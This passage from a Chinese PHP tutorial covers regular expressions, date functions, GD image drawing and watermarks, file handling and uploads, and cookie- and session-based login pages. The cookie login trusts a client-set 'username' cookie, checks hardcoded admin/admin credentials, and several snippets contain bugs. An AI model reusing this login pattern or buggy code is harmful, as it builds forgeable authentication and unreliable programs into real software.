匹配0次、或1次、或多次其前面的字符//.*配合使用默认情况下是贪婪匹配(尽可能多的去匹配字符)+    匹配1次或多次其前面的字符?    匹配0次或1次其前面的字符//.*配合后面加个?懒惰匹配{n}    表示其前面字符恰好出现n次{n,}    表示其前面字符出现不少于n次{n,m}    表示其前面的字符至少出现n次，最多出现m次^或\A    匹配字符串开始位置$或者\Z    匹配字符串的结束位置//^与$配合使用：$a=&#39;/^test$/&#39;;|    匹配两个或多个模式//$a=&#39;/test|abc/&#39;;[]    匹配方括号中的任意一个字符//$a=&#39;/t[eabcd]st/&#39;;[^]    匹配除方括号中字符以外的任意一个字符/$a=&#39;/t[^e]st/&#39;;()    将括号中作为一个整体以便将其中的内容获取到    在我们的正则表达式中 可以使用圆括号来将某一段括起来，在圆括号的后面部分，我们可以使用    \\数字 来代表圆括号部分所匹配到的内容！例：$a=&#39;/t(e)st\\1/&#39;;//除了匹配字符串test，还匹配到了字符e。\\1代表第一个圆括号所匹配到的内容‘/teste/’$str=&#39;  test   &#39;;</code></pre><p><strong>5、模式修正符</strong></p><p>常见模式修正符<br><code>i</code>    在和模式进行匹配时不区分大小写</p><p>例：<code>$a=&#39;/test/i&#39;;</code></p><p><code>m</code>    多行匹配，如果目标字符串 中没有”\n”字符, 或者模式中没有出现^或$, 设置这个修饰符不产生任何影响</p><p>使用条件：</p><p>(1)目标字符串中必须包含“\n”</p><p>(2)正则表达式中必须要出现^或$</p><p>模式修正符m的作用：多行匹配</p><p>例：</p><pre><code class="php">$pattern=&#39;/test$/m&#39;;$str=&quot;test\ntest\n&quot;;$pattern=&#39;/test\r*$/m&#39;;$str=&quot;testtesttest&quot;;//最后一个匹配不到，所以加*//在windows操作系统中所看到的换行(现象),其实是通过两个字符来完成的(\r\n)//在Linux操作系统中所看到的换行(现象),其实是通过(\n)来完成的</code></pre><p><code>s</code>    如果设定了此修正符，那么.将匹配所有的字符包括换行符</p><p>例：</p><pre><code class="php">$pattern=&#39;/t.st/s&#39;;$str=&quot;t\st&quot;//可以匹配到“\”</code></pre><p><code>U</code>    禁止贪婪匹配</p><p>例：</p><pre><code class="php">$pattern=&#39;/a.*f/U&#39;;//等价于$pattern=&#39;/a.*?f/&#39;;$str=&quot;  adwqfsav  avsfaf&quot;;</code></pre><p><strong>模式修正符是可以多个搭配使用的</strong></p><p><strong>6、与正则表达式配合的函数</strong></p><p><strong><u>常用：</u></strong></p><p><strong><a href="https://www.php.net/manual/zh/function.preg-match-all.php" target="_blank" rel="noopener">preg_match_all</a> — 执行一个全局正则表达式匹配</strong></p><p><strong>参数说明：</strong></p><p>第四个参数（可选）：<br>PREG_PATTERN_ORDER<br>PREG_SET_ORDER<br>PREG_OFFSET_CAPTURE<br>第五个参数(可选):可以传一个值,来表示从目标字符串的哪个位置开始搜索(单位是字节)</p><pre><code class="php">$pattern=&#39;/a.*f/U&#39;;//等价于$pattern=&#39;/a.*?f/&#39;;$str=&quot;  adwqfsav  avsfaf&quot;;var_dump(preg_match_all($pattern,$str,$arr));var_dump($arr);</code></pre><p><img src="http://img-blog.csdnimg.cn/20190801132733607.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong><a href="https://www.php.net/manual/zh/function.preg-match.php" target="_blank" rel="noopener">preg_match</a> — 执行匹配正则表达式</strong></p><p>匹配一次就结束，匹配不到返回0</p><p><strong>参数说明：</strong><br>第一个参数:正则表达式<br>第二个参数：目标字符串<br>第三个参数(可选):放一个变量，执行完成之后，里面会有匹配到的部分以及等等一些数据！<br>第四个参数(可选):可以传PREG_OFFSET_CAPTURE进入(那么第三个参数那个变量里面的数据就会有匹配到的部分的偏移值)，默认传的是0<br>第五个参数(可选):可以传一个值,来表示从目标字符串的哪个位置开始搜索（单位是字节）</p><pre><code class="php">$pattern=&#39;/a.*f/U&#39;;//等价于$pattern=&#39;/a.*?f/&#39;;$str=&quot;  adwqfsav  avsfaf&quot;;var_dump(preg_match($pattern,$str,$arr,PREG_OFFSET_CAPTURE));var_dump($arr);</code></pre><p><img src="http://img-blog.csdnimg.cn/20190801132742397.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong><a href="https://www.php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">preg_replace</a> — 执行一个正则表达式的搜索和替换</strong></p><p><strong>参数说明：</strong><br>第一个参数：正则表达式<br>第二个参数：要替换成的字符串<br>第三个参数：目标字符串<br>第四个参数(可选)：默认是-1，就是替换所有符合特征部分的！<br>第五个参数(可选):你可以放一个变量在这边</p><pre><code class="php">$pattern=&#39;/&lt;div(.*?)&gt;(.*?)&lt;\/div&gt;/&#39;;$str1=&#39;&lt;a$1 href=&quot;http://www.baidu.com&quot;&gt;$2&lt;/a&gt;&#39;;$str=&#39;dwqdwq&lt;div style=&quot;color:red;font-size:25px;&quot;&gt;测试成为绯闻绯闻绯闻绯dwqdwqdwq闻cqdwqdqw&lt;/div&gt;dqwwdqdwq&lt;div&gt;我是后面那个div&lt;/div&gt;&#39;;if(preg_match($pattern, $str,$arr)){    echo &#39;替换后的：&#39;.preg_replace($pattern, $str1, $str,-1,$count);    var_dump($count);}else{    echo &#39;对不起，没有找到！&#39;;}echo &#39;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&#39;;echo &#39;原来的字符串：&#39;.$str;</code></pre><p>传数组</p><pre><code class="php">//preg_replace第一个参数与第二个参数传数组，一一对应的去替换！$pattern=array(        &#39;/&lt;div(.*?)&gt;(.*?)&lt;\/div&gt;/&#39;,        &#39;/&lt;p(.*?)&gt;(.*?)&lt;\/p&gt;/&#39;);$str1=array(        &#39;&lt;a$1 href=&quot;http://sifangku.com&quot;&gt;$2&lt;/a&gt;&#39;,        &#39;&lt;span$1&gt;我是span标签啦！$2&lt;/span&gt;&#39;);$str=&#39;dwqdwq&lt;div style=&quot;color:red;font-size:25px;&quot;&gt;测试成为绯闻绯闻绯闻绯dwqdwqdwq闻cqdwqdqw&lt;/div&gt;dqwwdqdwq&lt;p&gt;我是后面那个div&lt;/p&gt;&#39;;echo &#39;替换后的：&#39;.preg_replace($pattern, $str1, $str,-1,$count);var_dump($count);echo &#39;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&#39;;echo &#39;原来的字符串：&#39;.$str;</code></pre><p>其他字符串函数：</p><ul><li><a href="https://www.php.net/manual/zh/function.preg-filter.php" target="_blank" rel="noopener">preg_filter</a> — 执行一个正则表达式搜索和替换</li><li><a href="https://www.php.net/manual/zh/function.preg-grep.php" target="_blank" rel="noopener">preg_grep</a> — 返回匹配模式的数组条目</li><li><a href="https://www.php.net/manual/zh/function.preg-last-error.php" target="_blank" rel="noopener">preg_last_error</a> — 返回最后一个PCRE正则执行产生的错误代码</li><li><a href="https://www.php.net/manual/zh/function.preg-match-all.php" target="_blank" rel="noopener">preg_match_all</a> — 执行一个全局正则表达式匹配</li><li><a href="https://www.php.net/manual/zh/function.preg-match.php" target="_blank" rel="noopener">preg_match</a> — 执行匹配正则表达式</li><li><a href="https://www.php.net/manual/zh/function.preg-quote.php" target="_blank" rel="noopener">preg_quote</a> — 转义正则表达式字符</li><li><a href="https://www.php.net/manual/zh/function.preg-replace-callback-array.php" target="_blank" rel="noopener">preg_replace_callback_array</a> — Perform a regular expression search and replace using callbacks</li><li><a href="https://www.php.net/manual/zh/function.preg-replace-callback.php" target="_blank" rel="noopener">preg_replace_callback</a> — 执行一个正则表达式搜索并且使用一个回调进行替换</li><li><a href="https://www.php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">preg_replace</a> — 执行一个正则表达式的搜索和替换</li><li><a href="https://www.php.net/manual/zh/function.preg-split.php" target="_blank" rel="noopener">preg_split</a> — 通过一个正则表达式分隔字符串</li></ul><h3 id="二、日期与时间"><a href="#二、日期与时间" class="headerlink" title="二、日期与时间"></a>二、日期与时间</h3><p><strong>1、设置时区</strong></p><pre><code class="php">date_default_timezone_set(&#39;Asia/Shanghai&#39;);//设置时区</code></pre><p><strong>2、获取当前Unix时间戳</strong></p><p>Unix时间戳：从Unix纪元(格林威治时间1970年1月1日00时00分00秒)开始到当前的秒数</p><pre><code class="php">time()</code></pre><p><strong>3、获取指定时间的Unix时间戳</strong></p><pre><code class="php">//mktime()date_default_timezone_set(&#39;Asia/Shanghai&#39;);//设置时区$nowTime=time();$time1=mktime(0,0,0,10,1,2014);//取得一个日期的 Unix 时间戳echo &#39;距离2014年国庆还有&#39;.(($time1-$nowTime)/60/60/24).&#39;天&#39;;</code></pre><p><strong>4、从Unix时间戳取得时间日期信息</strong><br><strong>date()</strong>格式化一个本地时间／日期<br>第一个参数:必填,写上你所需要的时间日期的格式,把format 字符放在第一个参数里面会被转换成对应的信息,其他的字符还是原来的样子</p><pre><code class="php">date(&#39;Y-m-d G:i:s&#39;)//Y:年 m:月 d:日 G:时 i:分 s:秒 </code></pre><p>自定义格式化Unix时间戳 为指定的时间格式。可以查询php使用手册：date()<br><strong>5、获取Unix时间戳和微秒数</strong></p><pre><code class="php">microtime() 返回当前 Unix 时间戳和微秒数var_dump(microtime());var_dump(microtime(true));//返回一个浮点数</code></pre><pre><code class="php">round()//指定精度`如：round($a,4)//四舍五入$a,保留4位小数</code></pre><h3 id="三、图像处理"><a href="#三、图像处理" class="headerlink" title="三、图像处理"></a>三、图像处理</h3><p>学前需要了解：在PHP中可以通过GD库处理图像(php的扩展库)<br>创建一个图像应该完成如下所示的四个基本步骤：<br><strong>1.创建图像</strong></p><p>1.创建新的</p><pre><code class="php">  imagecreatetruecolor()//新建一个真彩色图像</code></pre><p>2.打开服务器或网络文件中已经存在的GIF,JPEG,PNG,WBMP格式图像</p><pre><code class="php">imagecreatefromjpeg()imagecreatefrompng()imagecreatefromgif()imagecreatefromwbmp()</code></pre><p>  创建或者打开失败的时候会返回空字符串，并且输出一条错误信息。</p><pre><code class="php">imagesx()//输出画布宽度imagesy()//输出画布高度getimagesize()//取得图像大小</code></pre><p><strong>2.绘制图像</strong></p><p>图像创建完成以后，就可以通过这个图像资源，使用各种画像函数设置图像的颜色、填充图像、画点、线段、以及向图像的添加文本等</p><pre><code class="php">1.imagecolorallocate()//分配颜色2.imagefill()//区域填充3.imagesetpixel()//画一个单一像素4.imageline()//画一条线段5.imagerectangle()//画一个矩形6.imagestring()//水平地画一行字符串7.imagettftext()//用 TrueType 字体向图像写入文本8.imagettfbbox()//计算 TrueType 文字所占区域9.imagecopy()//拷贝图像的一部分10.imagecopymerge()//拷贝并合并图像的一部分11.imagecopyresampled()//重采样拷贝部分图像并调整大小</code></pre><p><strong>3.输出图像</strong></p><pre><code class="php">header(&#39;Content-type:image/jpeg&#39;);//输出图像为jpeg时</code></pre><p>​    header函数注意点<br>​    在该函数之前，不能输出任何内容<br>​    在我们的PHP代码 的函数里面，我们使用的/开头的路径 这个/不是指 web根目录,而是操作系统的 文件的根目录!<br><strong>4.释放资源</strong></p><p>设计验证码的步骤：</p><p>水印</p><p>缩放与裁剪<br>    imagecopyresampled()函数<br>    采样某个图像资源的 某一部分 到 另外一个图像资源上面去</p><p><strong>例1(jpeg图像)：</strong></p><pre><code class="php">header(&#39;Content-type:text/html;charset:utf-8&#39;);//设置编码header(&#39;Content-type:image/jpeg&#39;);//输出图像为jpeg时$img=imagecreatetruecolor(200,100);//新建一个宽200高100的真彩色图像$color1=imagecolorallocate($img,20,40,255);//分配颜色,采用RGB格式$color2=imagecolorallocate($img,70,80,90);imagefill($img,0,0,$color1);//区域填充,从左上角0，0处进行填充imagejpeg($img);//输出图像为jpeg格式/*if(imagejpeg($img,&#39;1.jpeg&#39;)){    echo &#39;保存成功&#39;;}//加参数是保存图像,可以写相对路径*/imagecopyresampled($img);//释放资源</code></pre><p><img src="http://img-blog.csdnimg.cn/20190801132751836.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>例2(验证码)：</strong></p><pre><code class="php">header(&#39;Content-type:text/html;charset:utf-8&#39;);//设置编码header(&#39;Content-type:image/jpeg&#39;);//输出图像为jpeg时$width=120;//图像宽$height=40;//图像高$element=array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;);//字符串所包含字符$string=&#39;&#39;;//初始化字符for ($i=0;$i&lt;5;$i++){//字符串字符个数    $string.=$element[rand(0,count($element)-1)];//每次在$element随机选择字符并赋给$string}$img=imagecreatetruecolor($width, $height);//创建图像$colorBg=imagecolorallocate($img,rand(200,255),rand(200,255),rand(200,255));//背景颜色，RGB格式，且RGB在200到255随机$colorBorder=imagecolorallocate($img,rand(200,255),rand(200,255),rand(200,255));//边框颜色，RGB格式，且RGB在200到255随机$colorString=imagecolorallocate($img,rand(10,100),rand(10,100),rand(10,100));//字符串颜色，RGB格式，且RGB在10到100随机imagefill($img,0,0,$colorBg);//区域填充imagerectangle($img,0,0,$width-1,$height-1,$colorBorder);//画一个宽为119，高为39的矩形。并显示边框颜色for($i=0;$i&lt;100;$i++){//画了100个点，并在矩形里随机分布。点的颜色，RGB格式，且RGB在100到200随机    imagesetpixel($img,rand(0,$width-1),rand(0,$height-1),imagecolorallocate($img,rand(100,200),rand(100,200),rand(100,200)));}for($i=0;$i&lt;3;$i++){//画了3条线    imageline($img,rand(0,$width/2),rand(0,$height),rand($width/2,$width),rand(0,$height),imagecolorallocate($img,rand(100,200),rand(100,200),rand(100,200)));}//imagestring($img,5,0,0,&#39;abcd&#39;,$colorString);//不太常用，一般用下面这种方式imagettftext($img,19,rand(-5,5),rand(5,15),rand(30,35),$colorString,&#39;font/Inkfree.ttf&#39;,$string);//19是字体大小  rand(-5,5)是偏转角度从-5到5的随机角度  rand(5,15)和rand(30,35)是宽和高的范围  $colorString是字体颜色  &#39;font/Inkfree.ttf&#39;是使用字体样式的路径  $string是字符串imagejpeg($img);//输出图像imagedestroy($img);//释放资源</code></pre><p><img src="http://img-blog.csdnimg.cn/20190801132800666.jpg" alt="在这里插入图片描述"></p><p><strong>例3(文字水印)：</strong></p><pre><code class="php">header(&#39;Content-type:text/html;charset:utf-8&#39;);//设置编码header(&#39;Content-type:image/jpeg&#39;);//输出图像为jpeg时$img=imagecreatefromjpeg(&#39;images/1.jpg&#39;);//打开images文件下的1.jpg图片(也可以打开浏览器上的图片，写图片地址)$color=imagecolorallocate($img,255,255,255);//颜色$width=imagesx($img);//取得图像宽度$height=imagesy($img);//取得图像高度$position=imagettfbbox(20,0,&#39;font/Inkfree.TTF&#39;,&#39;qwzf&#39;);$stringWidth=$position[2]-$position[0];//水印宽度imagettftext($img,20,0,$width-1-$stringWidth-($width/30),$height-1-($height/30), $color,&#39;font/Inkfree.TTF&#39;,&#39;qwzf&#39;);//$width-1-$stringWidth-($width/30),$height-1-($height/30)把水印放在右下角imagejpeg($img);//输出图像imagedestroy($img);//释放资源</code></pre><p><strong>例4(图片水印)：</strong></p><pre><code class="php">header(&#39;Content-type:image/jpeg&#39;);$img=imagecreatefromjpeg(&#39;images/zcx.jpg&#39;);$waterMark=imagecreatefromgif(&#39;images/watermark.gif&#39;);$color=imagecolorallocate($img,255,255,255);$width=imagesx($img);$height=imagesy($img);$waterMarkWidth=imagesx($waterMark);$waterMarkHeight=imagesy($waterMark);$position=imagettfbbox(20,0,&#39;font/Inkfree.TTF&#39;,&#39;qwzf&#39;);$stringWidth=$position[2]-$position[0];//文字水印//imagettftext($img,20,0,$width-1-$stringWidth-($width/30),$height-1-($height/30), $color,&#39;font/china1.TTF&#39;,&#39;小刚/周传雄&#39;);/*imagecopy($img,$waterMark,100,100,0,0,$waterMarkWidth,$waterMarkHeight);参数说明：$img:目标图像资源$waterMark:水印的图像资源100:所要拷贝到目标图像资源上面的坐标(x轴位置)100:所要拷贝到目标图像资源上面的坐标(y轴位置)0:从水印的图像资源的x坐标为0的位置开始拷贝0:从水印的图像资源的y坐标为0的位置开始拷贝$waterMarkWidth:所要拷贝的水印图像的长度$waterMarkHeight:所要拷贝的水印图像的高度*/imagecopy($img,$waterMark,$width-1-$waterMarkWidth,$height-1-$waterMarkHeight,0,0,$waterMarkWidth,$waterMarkHeight);imagejpeg($img);imagedestroy($img);</code></pre><p><strong>例4(裁剪和收缩)：</strong></p><pre><code class="php">//等比例缩放(裁剪)header(&#39;Content-type:image/jpeg&#39;);$img=imagecreatefromjpeg(&#39;images/zcx.jpg&#39;);$imgWidth=imagesx($img);$imgHeight=imagesy($img);$height=$width/($imgWidth/$imgHeight);$img1=imagecreatetruecolor($width,$height);/*imagecopyresampled($dst_image, $src_image, $dst_x, $dst_y, $src_x, $src_y, $dst_w, $dst_h, $src_w, $src_h)参数说明：$dst_image:目标图像资源$src_image:源图像资源（你要采样的那个图像资源）$dst_x:$dst_y:与上面的$dst_x确定了一个坐标,把采样到的部分 放到目标图像资源的什么位置$src_x:$src_y:与上面的$src_y确定了一个坐标,你要采样的原图像资源的 某个部分的起始坐标$dst_w:$dst_h:与上面的$dst_w确定了 放到目标图像资源上面的尺寸$src_w:$src_h:与上面的$src_w确定了 采样原图像资源的 某个部分*/imagecopyresampled($img1,$img,0,0,0,0,$width,$height,$imgWidth,$imgHeight);//裁剪//imagecopyresampled($img1,$img,0,0,0,0,100,100,100,100);if(imagejpeg($img1)){    imagejpeg($img1,&#39;images/zoom_zcx.jpg&#39;);}imagedestroy($img);imagedestroy($img1);</code></pre><h3 id="四、文件与目录操作"><a href="#四、文件与目录操作" class="headerlink" title="四、文件与目录操作"></a>四、文件与目录操作</h3><p>任何数据类型变量所存储的数据，都是在程序运行时才加载到内存中，而不能持久保存，那么如果需要将数据长久的保存起来，主要有两种办法，保存到普通文件中或者保存到数据库中。PHP可以在服务器上生成目录，创建、编辑、删除、修改文件属性等操作</p><p><strong>1、判断普通文件和目录</strong></p><pre><code class="php">    1.is_file()//判断给定文件名是否为一个正常的文件(如：文件)    2.is_dir()//判断给定文件名是否是一个目录(如：文件夹)</code></pre><p><strong>2、文件的属性</strong></p><pre><code class="php">    1.file_exists()//检查文件或目录是否存在    2.filesize()//取得普通文件大小(字节)    3.is_readable()//判断给定文件名是否可读    4.is_writable()//判断给定的文件名是否可写    5.filectime()//获取文件的创建时间    6.filemtime()//获取文件的修改时间    7.fileatime()//取得文件的上次访问时间    8.stat()//获取文件大部分属性值</code></pre><p><strong>3、目录的基本操作</strong></p><pre><code class="php">    1.basename()//返回路径中的文件名部分    2.dirname()//返回路径中的目录部分    3.pathinfo()//返回文件路径的信息    4.opendir()//打开目录句柄    5.readdir()//从目录句柄中读取条目,返回目录中下一个文件的文件名    6.rewinddir()//倒回目录句柄    7.closedir()//关闭目录句柄    8.mkdir()//新建目录    9.rmdir()//删除指定的空目录    10.scandir()//列出指定路径中的文件和目录</code></pre><p><strong>4、文件的基本操作</strong></p><pre><code class="php">    1.fopen()//打开文件或者 URL r只读 r+读写    2.fread()//读取文件    3.fgets()//从文件指针中读取一行    4.feof()//测试文件指针是否到了文件结束的位置    5.fwrite()//写入文件，返回写入的字节数    6.rewind()//倒回文件指针的位置    7.flock()//轻便的咨询文件锁定    8.ftruncate()//将文件截断到给定的长度    9.fclose()//关闭一个已打开的文件指针    10.file() //把整个文件读入一个数组中    11.copy()//拷贝文件    12.unlink()//删除文件    13.file_get_contents()//将整个文件读入一个字符串    14.file_put_contents()//将字符串写入文件中    15.rename()//重命名一个文件或目录    16.readfile()//读入一个文件并写入到输出缓冲</code></pre><p>例：</p><pre><code class="php">$file=fopen(&#39;1.txt&#39;,&#39;r&#39;);//打开1.txt文件，只读var_dump(fread($file,2));//读取两个字节var_dump(fgets($file));//读一行</code></pre><p><strong>5、文件的上传</strong><br>文件的上传的过程这些细节是不需要管的，都是自动的，上传的文件默认是放在一个临时的目录里面的，我们要做的就是把这些临时目录里面的文件移动到我们需要的地方</p><p>1.html标签需要做的上传设置</p><p>(1) form标签属性设置 </p><p>​       &lt;1&gt;method设置为post</p><p>​       &lt;2&gt;enctype设置为multipart/form-data</p><p>​       &lt;3&gt;form表单中设置隐藏类型的input,其中name值设置为MAX_FILE_SIZE,VALUE值设置为需要限制的上传文件的大小(单位为字节)</p><p>2.在服务器端通过PHP处理上传文件，涉及到下面的几条信息</p><p>(1)与上传有关的 php配置选项(php.ini)</p><p>​           </p><pre><code>     配置项                          可能值                             功能描述  file_uploads                       ON                        确定服务器上的PHP脚本是否可以接受HTTP文件上传  memory_limit                       8M                        设置脚本可以分配的最大内存量，防止失控的脚本独占服务器内存  upload_max_filesize                2M                        限制PHP处理上传文件的最大值，此值必须小于post_max_size值  post_max_size                      8M                        限制通过POST方法可以接受的信息最大量  upload_tmp_dir                     F:/wamp/tmp               上传文件存放的临时路径，可以是一个绝对路径。这个目录对于拥有此服务器进程用户必须是可写的。</code></pre><p>(2)<code>$_FILES</code>多维数组：用于存储各种与上传有关的信息</p><p>​       <code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>             客户端机器文件的原名称，包含扩展名</p><p>​       <code>$_FILES[&#39;file&#39;][&#39;size&#39;]</code>               已上传文件的大小，单位为字节</p><p>​       <code>$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]</code>    文件上传之后，在服务器端存储的临时文件名</p><p>​       <code>$_FILES[&#39;file&#39;][&#39;error&#39;]</code>              文件上传时产生的错误</p><p>​           0：表示没有发生任何错误，文件上传成功</p><p>​           1：表示上传文件的大小超出了再PHP配置文件中upload_max_filesize选项限制的值</p><p>​           2：表示上传文件大小超出了HTML表单中MAX_FILE_SIZE选项所指定的值   </p><p>​           3：表示文件只被部分上传</p><p>​           4：表示没有上传任何文件</p><p>​        <code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code>              获取客户端上传文件的MIME类型，MIME类型规定了各种文件格式的类型。每种MIME类型都是由/分隔的主类型和子类型组成</p><p>(3)PHP的文件上传处理函数：用于上传文件的后续处理</p><p>​       &lt;1&gt;is_uploaded_file()判断指定的文件是否通过HTTP POST上传的</p><p>​       &lt;2&gt;move_uploaded_file()文件上传后，首先会存储于服务器的临时目录中，可以使用该函数将上传的文件移动到新位置</p><p><strong>6、文件的下载</strong></p><p>(1)发送指定的文件MIME类型的头信息</p><pre><code class="php">header(&#39;Content-type:MIME类型&#39;);</code></pre><p>(2)指定下载文件的描述</p><pre><code class="php"> header(&#39;Content-Disposition:attachement;filename=文件名称&#39;);</code></pre><p>(3)指定下载文件的大小</p><pre><code class="php"> header(&#39;Content-Length:文件大小&#39;);</code></pre><p>(4)读取文件内容至输出缓冲区</p><pre><code class="php"> readfile();</code></pre><p>​    </p><p>获取文件的MIME类型：<a href="http://localhost/php/index.php" target="_blank" rel="noopener">http://localhost/php/index.php</a><br>就相当于：localhost/php/a.rar</p><h3 id="五、会话控制"><a href="#五、会话控制" class="headerlink" title="五、会话控制"></a>五、会话控制</h3><p><strong>1、cookie的设置、读取与删除</strong></p><p><em>客户端电脑中设置</em></p><pre><code class="php">header(&#39;Content-type:text/html;charset=utf-8&#39;);var_dump(setcookie(&#39;username&#39;,&#39;password&#39;,time()+3600));//var_dump(setcookie(&#39;member[username]&#39;,&#39;password&#39;,time()+3600));//将多维数组应用于Cookie中</code></pre><p><em>服务器端上读取</em></p><pre><code class="php">var_dump($_COOKIE);//超全局变量，在服务器端上读取Cookie的内容</code></pre><p><em>删除</em></p><pre><code class="php">header(&#39;Content-type:text/html;charset=utf-8&#39;);var_dump(setcookie(&#39;username&#39;,&#39;&#39;,time()-1));//删除Cookie/*foreach($_COOKIE[&#39;member&#39;] as $key=&gt;$val){//遍历数组删除cookie    var_dump(setcookie(&#39;member[{$key}]&#39;,&#39;&#39;,time()-3600));}*/</code></pre><p><strong>注意：</strong>使用setcookie删除cookie的时候，需要与当初设置cookie的时候参数一致</p><p><strong>2、session的开启、存储与销毁</strong></p><p>返回一个分配好的session id</p><p>把这个id保存在客户端的cookie里面</p><p>id对应的数据都是保存在服务器端</p><p><em>开启</em></p><pre><code class="php">session_start();</code></pre><p>(1)开启一个会话<br>(2)打开已经存在的会话<br>    根据客户端传来的session id 把这个 session id 对应的数据 读取到<code>$_SESSION</code>这个变量里面</p><p><em>存储</em></p><pre><code class="php">header(&#39;Content-type:text/html;charset=utf-8&#39;);session_start();$_SESSION[&#39;name&#39;]=&#39;qwzf&#39;;$_SESSION[&#39;email&#39;]=&#39;1739381035@qq.com&#39;;</code></pre><p><em>读取</em></p><pre><code class="php">header(&#39;Content-type:text/html;charset=utf-8&#39;);session_start();//开启会话var_dump($_SESSION);//接收服务器端返回的数据，并输出//var_dump($_COOKIE);//输出cookie//var_dump(session_name());//session_name()获取cookie名称</code></pre><p><em>销毁</em></p><pre><code class="php">session_start();//打开要销毁的会话session_unset();//Free all session variables销毁变量session_destroy();//销毁一个会话中的全部数据setcookie(session_name(),&#39;&#39;,time()-3600,&#39;/&#39;);//销毁保存在客户端的session id  //“/”Web根目录</code></pre><p><strong>3、基于cookie或session的登录模块</strong></p><p><strong>COOKIE</strong></p><p><strong>login.php的源代码</strong></p><pre><code class="php">&lt;?php header(&#39;Content-type:text/html;charset=utf-8&#39;);if (isset($_COOKIE[&#39;username&#39;]) &amp;&amp; $_COOKIE[&#39;username&#39;]===&#39;admin&#39;) {    exit(&#39;您已经登录请不要重复登录&#39;);}if(isset($_POST[&#39;submit&#39;])){    if(isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;]===&#39;admin&#39; &amp;&amp; $_POST[&#39;password&#39;]===&#39;admin&#39;){        if(setcookie(&#39;username&#39;,$_POST[&#39;username&#39;],time()+3600)){            header(&#39;Location:index.php&#39;);        }else{            echo &#39;cookie设置失败！&#39;;        }    }else{        echo &quot;您的用户名或密码输入有误，&lt;a href=login.php&gt;请重新登录！&lt;/a&gt;&quot;;    }}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;title&gt;请登录&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;login.php&quot;&gt;    用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br /&gt;    密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;登录&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>index.php的源代码</strong></p><pre><code class="php">&lt;?php header(&#39;Content-type:text/html;charset=utf-8&#39;);if (isset($_COOKIE[&#39;username&#39;]) &amp;&amp; $_COOKIE[&#39;username&#39;]===&#39;admin&#39;) {    echo &quot;{$_COOKIE[&#39;username&#39;]}您好,欢迎回来！&quot;;    echo &quot;&lt;a href=&#39;logout.php&#39;&gt;注销&lt;/a&gt;&quot;;}else {    echo &quot;&lt;a href=&#39;login.php&#39;&gt;请登录&lt;/a&gt;&quot;;}?&gt;</code></pre><p><strong>logout.php的源代码</strong></p><pre><code class="php">&lt;?php header(&#39;Content-type:text/html;charset=utf-8&#39;);if (isset($_COOKIE[&#39;username&#39;]) &amp;&amp; $_COOKIE[&#39;username&#39;]===&#39;admin&#39;) {    if(setcookie(&#39;username&#39;,$_POST[&#39;username&#39;],time()-3600)){        header(&#39;Location:login.html&#39;);    }else{        echo &quot;&lt;script type=&#39;text/javascript&#39;&gt;alert(&#39;注销失败&#39;);location=&#39;index.php&#39;;&lt;/script&gt;&quot;;    }}?&gt;</code></pre><p><strong>SESSION</strong></p><p><strong>login.php的源代码</strong></p><pre><code class="php">&lt;?php session_start();header(&#39;Content-type:text/html;charset=utf-8&#39;);if (isset($_SESSION[&#39;username&#39;]) &amp;&amp; $_SESSION[&#39;username&#39;]===&#39;admin&#39;) {    exit(&#39;您已经登录请不要重复登录&#39;);}if(isset($_POST[&#39;submit&#39;])){    if(isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;]===&#39;admin&#39; &amp;&amp; $_POST[&#39;password&#39;]===&#39;admin&#39;){        $_SESSION[&#39;username&#39;]=$_POST[&#39;username&#39;];        header(&#39;Location:index.php&#39;);    }else{        echo &quot;您的用户名或密码输入有误，&lt;a href=login.php&gt;请重新登录！&lt;/a&gt;&quot;;    }}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;title&gt;请登录&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;login.php&quot;&gt;    姓名：&lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;    密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;    &lt;input 